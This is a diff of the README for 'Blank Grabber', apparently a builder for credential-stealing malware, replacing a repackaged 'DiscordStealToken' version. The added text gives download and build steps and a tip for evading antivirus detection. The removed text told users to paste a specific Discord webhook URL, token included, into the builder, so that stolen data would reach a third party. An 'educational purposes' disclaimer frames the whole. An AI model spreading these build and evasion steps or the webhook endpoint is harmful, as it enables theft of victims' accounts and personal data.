@@ -1,16 +1,10 @@
 <h1 align="center">
-DiscordStealToken
+   Blank Grabber
 </h1>
 <p align= "center">
-
-
-   
-   <<<<<<<<<<![68747470733a2f2f692e696d6775722e636f6d2f633163556d5a462e706e67](https://github.com/sleshTekk/DiscordSteal/assets/163595476/cad57ecc-3162-4a8f-858a-c0821256a0cf)>>>>>>>>>
-
-
-
+   <kbd>
+   <img  src="https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png">
    </kbd><br><br>
-   
    <img src="https://img.shields.io/github/languages/top/Blank-c/Blank-Grabber">
    <img src="https://img.shields.io/github/stars/Blank-c/Blank-Grabber">
    <img src="https://img.shields.io/github/forks/Blank-c/Blank-Grabber">
@@ -25,7 +19,6 @@ DiscordStealToken
    <img src="https://repobeats.axiom.co/api/embed/3183aa00d01f8636a5cbc17344c36168eff93aec.svg">
 </p>
 
-
 ## Project Status: Coming to an End
 
 Dear contributors and users,
@@ -38,6 +31,8 @@ However, as the saying goes, all good things must come to an end. As I approach 
 
 I want to express my sincere appreciation to everyone who has participated in this project, be it through code contributions, issue reporting, or offering valuable insights. Your involvement has been the driving force behind the project's success.
 
+I'm happy to announce that noahmajors, one of the contributors to this project, has taken the initiative to fork the repository and continue its development. You can find the active fork at the following link: https://github.com/f4kedre4lity/Blank-Grabber
+
 I encourage you all to show your support to noahmajors and the new direction they will take the project. Please consider contributing to the fork if you are interested in its future development.
 
 While this marks the end of my direct involvement with this project, I sincerely hope that the codebase and knowledge shared here will continue to benefit the community.
@@ -49,22 +44,22 @@ Blank-c
 
 ## Table of Contents
 
-
+- [Download](#download)
 - [Features](#features)
 - [Stub Settings](#stub-settings)
 - [Requirements](#requirements)
 - [How to Build?](#how-to-build)
 - [Support the Project](#support-the-project)
 
+## Download
 
-
-
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
 **Note:** If the grabber fails to function, attempt rebuilding it without enabling the "Anti VM" option.
 
-
+**Note 2:** To decrease the chances of detections, you can download [MingGW-w64 (with GCC)](https://github.com/niXman/mingw-builds-binaries/releases/download/13.1.0-rt_v11-rev1/x86_64-13.1.0-release-win32-seh-msvcrt-rt_v11-rev1.7z) and include the "bin" folder in the PATH variable.
 
 ## Features
 
@@ -123,30 +118,19 @@ Blank-c
 
 **To build the stub, you need:**
 - Windows 10.
-- Python 3.10.9
+- Python 3.10+.
 - An active internet connection.
 
 ## How to Build?
 
-1. Download and install [Python 3](https://www.python.org/downloads/release/python-3109/) (Make sure to enable the *Add to PATH* option.)
-2. Verify the installation by executing `python --version` 
-3. [Download Blank Grabber]. Click Code (green button) and Download ZIP 
-4. Download in CMD `pip install pycryptodome` `pip install requests` `pip install pywin32`
+1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
+2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
+3. [Download Blank Grabber](#download).
+4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 5. Navigate to the **Blank Grabber** folder and double click *Builder.bat* file.
-6. After that, insert the webhook into Enter Webhook here which will be below
-7.     https://discord.com/api/webhooks/1218326023754743829/RgIArUH9BoYBP94Febeiymz51O-bR1g5PIa5uoF9YTbEjsqPjjM1DNIM_gCixTSyba-U
-8. That's it, click the build and you can run it
-9. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
+6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
 
 [![Tutorial video](https://img.shields.io/badge/Watch-Tutorial-blue?style=for-the-badge&logo=youtube)](https://streamable.com/r9sa14)
-
-![68747470733a2f2f692e696d6775722e636f6d2f7a5265566f6a502e706e67](https://github.com/sleshTekk/DiscordSteal/assets/163595476/afa2796f-5223-4c2c-a283-1f24427440c0)
-
-![68747470733a2f2f692e696d6775722e636f6d2f633163556d5a462e706e67](https://github.com/sleshTekk/DiscordSteal/assets/163595476/8fe0c68e-0574-4cfd-8263-5deaf887ac18)
-
-![68747470733a2f2f692e696d6775722e636f6d2f3975386e4e62442e706e67](https://github.com/sleshTekk/DiscordSteal/assets/163595476/4157d3a4-4a6f-49a4-8efd-896867f63f04)
-
-
 
 ## Support the Project
 
